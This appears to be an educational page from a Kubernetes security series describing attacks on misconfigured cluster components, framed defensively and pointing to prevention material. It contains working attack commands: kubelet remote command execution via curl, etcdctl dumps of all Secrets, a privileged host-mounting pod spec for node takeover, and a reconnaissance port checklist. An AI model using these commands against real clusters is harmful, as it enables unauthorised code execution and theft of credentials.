# K09: Misconfigured Cluster Components - Attack Vectors

## Table of Contents
- [Understanding Component Attack Vectors](#understanding-component-attack-vectors)
- [Core Attack Flow](#core-attack-flow)
- [Common Attack Patterns](#common-attack-patterns)
- [Chaining Component Misconfigurations](#chaining-component-misconfigurations)

## Understanding Component Attack Vectors

> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and fix these issues in clusters you own or are authorised to test. Probing someone else's control plane is an intrusion.

Attacking misconfigured components is rarely about a crafted exploit. It is about **reaching a control surface and asking it politely**. Because Kubernetes components authenticate and authorize *themselves*, a single knob left at an insecure value—anonymous auth, `AlwaysAllow`, a plaintext etcd port—means the surface answers to anyone who can route a packet to it. The attacker's whole job becomes discovery plus a well-formed request.

The attacker's goal in this category is usually one of:
- Reach an API server, kubelet, or etcd that does not require real authentication or authorization.
- Turn that reach into **code execution** (kubelet `/exec`), **secret theft** (etcd, kubelet env), or **scheduling power** (create pods on any node).
- Harvest a service-account token from an executed container and pivot back to the API server to spread.

### Core Attack Flow

```
1. Discover
   |
   Scan for open control-plane / node ports:
   6443 (apiserver)  10250/10255 (kubelet)  2379/2380 (etcd)
   10257 (controller-mgr)  10259 (scheduler)
2. Probe authN/authZ
   |
   Hit each surface anonymously; see what it answers
   (anonymous-auth? AlwaysAllow? no client cert on etcd?)
3. Exploit
   |
   kubelet /exec, etcd get --prefix, create a pod, read Secrets
4. Escalate / Pivot
   |
   Steal service-account tokens, reach cloud metadata,
   move to other nodes, own the cluster
```

## Common Attack Patterns

### 1. Anonymous / Over-Permissive API Server

If the API server accepts anonymous requests and authorization is loose, the built-in `system:anonymous` user can act.

```
# Ask the API server who it thinks you are, unauthenticated:
curl -sk https://TARGET:6443/api/v1/namespaces/default/pods

# If --anonymous-auth=true AND authorization is permissive:
HTTP/1.1 200 OK        # pods listed with no credentials

# The single most damaging legacy case, the insecure port:
curl http://TARGET:8080/api/v1/secrets   # no TLS, no auth, no authz
```

**Payoff**: with `--insecure-port` or `AlwaysAllow`, the anonymous caller is effectively cluster-admin—read Secrets, create workloads, done.

### 2. Unauthenticated Kubelet Code Execution (port 10250)

A kubelet with `anonymous.enabled: true` and `authorization.mode: AlwaysAllow` exposes its full API. List pods, then run commands inside one.

```
# Enumerate pods the node is running:
curl -sk https://NODE:10250/pods | jq '.items[].metadata.name'

# Execute a command inside a chosen container:
curl -sk -X POST \
  "https://NODE:10250/run/<namespace>/<pod>/<container>" \
  -d "cmd=id"
# -> uid=0(root) ... command runs inside the container
```

**Payoff**: direct remote code execution on the node's workloads—then read every mounted Secret and service-account token from inside.

### 3. Read-Only Kubelet Port Disclosure (port 10255)

The read-only port has no authentication by design; if it is enabled, it volunteers cluster detail.

```
GET http://NODE:10255/pods     # full pod specs: images, env vars, mounts
GET http://NODE:10255/metrics  # workload + node telemetry
GET http://NODE:10255/spec     # node/cAdvisor spec

# Environment variables in pod specs frequently contain
# tokens, connection strings, and injected secrets.
```

**Payoff**: no code execution needed—secrets and internal topology leak straight out of the pod specs.

### 4. Exposed etcd Dumping All Secrets

etcd without client-certificate auth is the cluster's whole state, readable in one command.

```
# Plaintext / no-mTLS etcd on 2379:
etcdctl --endpoints=http://TARGET:2379 get / --prefix --keys-only

# Pull a specific Secret straight from the store:
etcdctl --endpoints=http://TARGET:2379 \
  get /registry/secrets/kube-system/admin-token --print-value-only

# Or steal a snapshot and read it offline:
etcdctl --endpoints=http://TARGET:2379 snapshot save cluster.db
```

**Payoff**: every Secret in the cluster—database passwords, TLS keys, tokens—especially where encryption-at-rest is not configured.

### 5. Scheduling a Malicious Pod via a Reachable API Server

If the reachable API server authorizes pod creation, the attacker schedules their own workload—typically a privileged pod that mounts the host.

```
POST /api/v1/namespaces/default/pods
{
  "spec": {
    "containers": [{
      "name": "x", "image": "alpine",
      "command": ["/bin/sh","-c","sleep 1d"],
      "securityContext": { "privileged": true },
      "volumeMounts": [{ "name": "h", "mountPath": "/host" }]
    }],
    "volumes": [{ "name": "h", "hostPath": { "path": "/" } }]
  }
}
# chroot /host  ->  full node compromise
```

**Payoff**: node takeover via a host-mounting privileged pod—the API server did the scheduling for them.

### 6. Exposed Component Metrics and Debug Endpoints

Scheduler, controller-manager, and kubelet metrics/profiling bound to all interfaces leak internals and, with profiling, allow resource abuse.

```
GET http://apiserver:6443/debug/pprof/     # if --profiling=true
GET http://scheduler:10259/metrics         # scheduling internals
GET http://controller:10257/metrics        # controller state
GET http://NODE:10255/metrics              # kubelet telemetry
```

**Payoff**: reconnaissance of cluster topology and workload names, plus profiling endpoints that can be driven to exhaust resources.

### 7. Missing Admission Plugins Enabling Node Impersonation

Without `NodeRestriction`, a stolen node/kubelet credential can modify objects beyond its own node.

```
# With a node credential but NO NodeRestriction admission plugin:
# the node can label/patch OTHER nodes and read pods it should not,
# widening a single-node compromise into a cluster-wide one.
```

**Payoff**: a one-node foothold becomes lateral movement across the cluster because the guardrail that scopes node identities was never enabled.

### 8. Missing / Weak mTLS Between Components

Disabled or unverified TLS between the API server and kubelets (or etcd) allows interception and impersonation.

```
--kubelet-certificate-authority   unset  -> API server does NOT verify
                                            the kubelet it talks to
etcd --peer-client-cert-auth=false        -> peers not authenticated
Self-signed, never-rotated certs          -> a leaked key is valid forever
```

**Payoff**: man-in-the-middle of control-plane traffic, or impersonation of a component whose certificate was never verified.

### 9. Disabled Audit Hiding the Attack

With no audit policy, none of the requests above are recorded.

```
# --audit-log-path unset:
#   kubelet /exec, etcd dumps, pod creation -> no server-side record
#   defenders cannot scope the breach; attacker operates unseen
```

**Payoff**: not an entry point but a force multiplier—the attacker's actions leave no trail, so detection and response fail.

## Chaining Component Misconfigurations

Individually these are serious; chained, they are total cluster compromise with no application bug involved:

```
Open kubelet 10250 (anon + AlwaysAllow)
        -> /exec into a pod, read its service-account token
        +
Token is a real ServiceAccount with broad RBAC
        -> use it against the API server (K03 overlap)
        +
No NodeRestriction / no PodSecurity admission
        -> schedule a privileged host-mounting pod on every node
        =  root on all nodes, all Secrets, full takeover
```

Another common chain, starting from the datastore:

```
etcd on 2379 without mTLS
        -> dump /registry/secrets, no encryption-at-rest
        +
One Secret is a cloud credential / kubeconfig
        -> authenticate to the API server as an admin
        +
Audit disabled
        -> the entire operation leaves no record
```

## Attacker's Reconnaissance Checklist

| Port | Component | What the attacker checks |
|------|-----------|--------------------------|
| 6443 | kube-apiserver | Anonymous access, insecure port, permissive authZ |
| 8080 | apiserver (legacy) | Insecure port bound = no-auth cluster-admin |
| 10250 | kubelet | Anonymous + AlwaysAllow = /exec code execution |
| 10255 | kubelet read-only | Unauthenticated pod specs, env vars, metrics |
| 2379 / 2380 | etcd client / peer | No mTLS = dump every Secret |
| 10257 / 10259 | controller-mgr / scheduler | Exposed metrics, profiling, health on all interfaces |

## Key Takeaways

1. **Components authenticate themselves**—a single insecure knob (anonymous auth, `AlwaysAllow`, plaintext etcd) opens the door with no exploit.
2. **The kubelet is a direct RCE surface**—an open `10250` means running commands inside your containers.
3. **etcd is one command from every Secret**—without mTLS and encryption-at-rest, the whole cluster's credentials leak at once.
4. **Small foothold + missing admission plugins = lateral movement**—`NodeRestriction` and `PodSecurity` are the guardrails that contain a single-node compromise.
5. **Disabled audit blinds the defender**—it turns an incident into an invisible one.

## Next Steps

- **[Prevention](prevention.md)**: Harden every component and verify with the CIS Benchmark
- **[Examples](examples.md)**: Insecure vs. hardened component configuration
- **[Kubernetes Learning Path](/learn/kubernetes)**: Continue with the rest of the Kubernetes Top 10
- **[Practice](/practice)**: Apply these concepts hands-on
